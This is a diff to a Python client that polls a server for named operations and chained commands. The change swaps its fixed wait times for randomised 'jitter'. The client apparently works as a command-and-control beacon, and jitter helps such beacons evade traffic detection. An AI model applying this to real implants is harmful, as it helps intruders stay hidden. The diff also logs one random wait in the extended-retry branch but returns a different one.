@@ -1,4 +1,4 @@
-import sys, time, os, threading, datetime, logging
+import sys, time, os, threading, datetime, logging, secrets
 
 import requests
 
@@ -7,9 +7,17 @@ log_file = os.path.join(
     'app.log'
 )
 
-default_wait_time = 5
-retry_wait_time = 60
-extended_wait_time = 3600
+secretsGenerator = secrets.SystemRandom()
+
+def default_wait_time():
+    return secretsGenerator.randint(5,15)
+
+def retry_wait_time():
+    return secretsGenerator.randint(60,120)
+
+def extended_wait_time():
+    return secretsGenerator.randint(3600,4000)
+    
 retry_threshold = 10
 
 logger = logging.getLogger(__name__)
@@ -38,10 +46,12 @@ class Client:
     def handle_timeout(self):
         self.retries += 1
         if self.retries % retry_threshold == 0:
-            logger.error(f"Max retries exceeded. Retrying in {extended_wait_time} seconds.")
-            return extended_wait_time
-        logger.warning(f'Exception retrieving command. Retrying in {retry_wait_time} seconds.')
-        return retry_wait_time
+            wait_time = extended_wait_time()
+            logger.error(f"Max retries exceeded. Retrying in {wait_time} seconds.")
+            return extended_wait_time()
+        wait_time = retry_wait_time()
+        logger.warning(f'Exception retrieving command. Retrying in {wait_time} seconds.')
+        return wait_time
 
     def fetch_next_command(self) -> int:
         if self.prev:
@@ -49,7 +59,7 @@ class Client:
                 r = requests.get(f'{self.server_addr}/cmd/{self.prev}')
                 if r.status_code != 200:
                     self.retries = 0
-                    return default_wait_time
+                    return default_wait_time()
                 
                 data = r.json()['data']
 
@@ -59,7 +69,7 @@ class Client:
                     return self.fetch_command(data['next'])
                 else:
                     self.retries = 0
-                    return default_wait_time
+                    return default_wait_time()
             except Exception as e:
                 logger.warning(e)
                 return self.handle_timeout()
@@ -70,7 +80,7 @@ class Client:
         try:
             r = requests.get(f'{self.server_addr}/op/fetch/{self.op_name}')
             if r.status_code != 200:
-                return default_wait_time
+                return default_wait_time()
             cmd_id = r.json()['data']['guid']
             return self.fetch_command(cmd_id)
         except Exception as e:
@@ -78,7 +88,7 @@ class Client:
             return self.handle_timeout()
         else:
             self.retries = 0
-            return retry_wait_time
+            return retry_wait_time()
 
     def fetch_command(self, cmd_id):
         try:
@@ -96,7 +106,7 @@ class Client:
             if 'next' in data:
                 return self.fetch_command(data['next'])
             else:
-                return default_wait_time
+                return default_wait_time()
 
     def handle_command(self, data):
         if 'type' not in data:
